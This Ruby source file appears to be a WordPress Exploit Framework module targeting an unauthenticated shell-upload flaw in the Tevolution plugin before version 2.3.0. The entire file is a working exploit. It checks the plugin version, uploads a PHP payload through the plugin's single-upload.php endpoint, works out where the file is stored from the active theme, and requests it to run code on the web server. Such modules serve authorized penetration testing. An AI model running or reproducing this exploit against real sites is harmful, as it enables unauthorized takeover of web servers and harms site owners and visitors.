class Wpxf::Exploit::TevolutionShellUpload < Wpxf::Module
  include Wpxf

  def initialize
    super

    update_info(
      name: 'Tevolution < 2.3.0 Shell Upload',
      desc: 'This module exploits a file upload vulnerability in versions '\
            '< 2.3.0 of the Tevolution plugin which allows unauthenticated '\
            'users to upload and execute PHP scripts in the context of the web server.',
      author: [
        'Rob Carr <rob[at]rastating.com>' # WPXF module
      ],
      references: [
        ['WPVDB', '8482'],
        ['URL', 'https://templatic.com/news/security-vulnerability-found-themes/']
      ],
      date: 'Apr 23 2016'
    )
  end

  def check
    change_log = normalize_uri(plugin_url, 'change_log.txt')
    check_version_from_custom_file(change_log, /\(Version\s(\d\.\d\.\d)\)/, '2.3.0')
  end

  def plugin_url
    normalize_uri(wordpress_url_plugins, 'Tevolution')
  end

  def uploader_url
    normalize_uri(plugin_url, 'tmplconnector', 'monetize', 'templatic-custom_fields', 'single-upload.php')
  end

  def payload_body_builder(payload_name)
    builder = Utility::BodyBuilder.new
    builder.add_file_from_string(Utility::Text.rand_alpha(5), payload.encoded, payload_name)
    builder
  end

  def scrape_current_theme
    res = execute_get_request(url: full_uri)
    res.body[/\/wp-content\/themes\/(.*?)\//, 1] if res && res.body
  end

  def uploaded_payload_location(payload_name)
    theme = scrape_current_theme
    normalize_uri(wordpress_url_themes, theme, 'images', 'tmp', payload_name)
  end

  def upload_payload(builder)
    res = nil
    builder.create do |body|
      res = execute_post_request(url: uploader_url, body: body)
    end

    if res.nil? || res.timed_out?
      emit_error 'No response from the target'
      return false
    end

    if res.code != 200
      emit_info "Response code: #{res.code}", true
      emit_info "Response body: #{res.body}", true
      emit_error 'Failed to upload payload'
      return false
    end
  end

  def execute_payload(payload_url)
    res = execute_get_request(url: payload_url)
    emit_success "Result: #{res.body}" if res && res.code == 200 && !res.body.strip.empty?
  end

  def run
    return false unless super

    emit_info 'Preparing payload...'
    payload_name = "#{Utility::Text.rand_alpha(rand(5..10))}.php"
    builder = payload_body_builder(payload_name)

    emit_info 'Uploading payload...'
    upload_payload(builder)

    payload_url = uploaded_payload_location(payload_name)
    emit_success "Uploaded the payload to #{payload_url}", true

    emit_info 'Executing the payload...'
    execute_payload(payload_url)

    true
  end
end
